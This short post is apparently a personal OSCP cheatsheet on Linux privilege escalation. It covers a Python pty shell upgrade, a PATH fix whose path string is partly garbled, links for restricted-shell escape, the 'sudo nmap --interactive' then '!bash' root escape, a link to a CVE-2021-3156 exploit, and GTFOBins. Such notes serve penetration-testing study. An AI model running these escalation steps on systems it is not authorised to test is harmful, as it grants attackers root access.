---
title: Linux Privilege Escalation
author: linatl
date: "2021-03-23 00:01"
tags: [OSCP, Cheatsheet]
layout: post
---

###### Upgrading Shells
```
Upgrade sh to bash using python2
> python -c 'import pty; pty.spawn("/bin/bash")'

Correcting the $PATH variable for sh / bash
> export PATH=$PATH:/usr/local/sbin:/usr/local/bin:/usr/sbin:/usr/bin:/sbin:/bin/usr/bin:/sbin:/binusr/local/sbin:/usr/local/bin:/usr/sbin:/bin

Upgrading from rbash:
https://www.hacknos.com/rbash-escape-rbash-restricted-shell-escape/
https://www.hackingarticles.in/multiple-methods-to-bypass-restricted-shell/
```

###### Sudo -l
```
List user privileges for sudo
> sudo -l

Nmap interactive
> sudo nmap --interactive
> nmap> !bash
```

###### CVE-2021-3156
```
64bit
https://github.com/worawit/CVE-2021-3156
```

###### GTFObins
```
https://gtfobins.github.io/
```
